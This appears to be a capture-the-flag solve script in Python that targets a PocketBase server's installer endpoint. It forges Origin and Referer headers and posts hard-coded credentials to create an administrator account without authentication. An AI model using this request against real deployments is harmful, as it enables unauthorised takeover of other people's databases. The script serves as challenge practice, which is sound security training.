import requests
import json

def setup_db(email, password):
    db_url = "http://justpocketthebase.web.jctf.pro"  # Replace with your actual database URL
    url = f"{db_url}/api/admins"
    headers = {
        "Origin": db_url,
        "Referer": f"{db_url}/_/?installer",
        "Connection": "close",
        "Content-Type": "application/json",
    }
    body = {
        "email": email,
        "password": password,
        "passwordConfirm": password,
    }
    response = requests.post(url, headers=headers, data=json.dumps(body))
    return response

r = setup_db("worth@email.com", "Test123$")
print(r.text)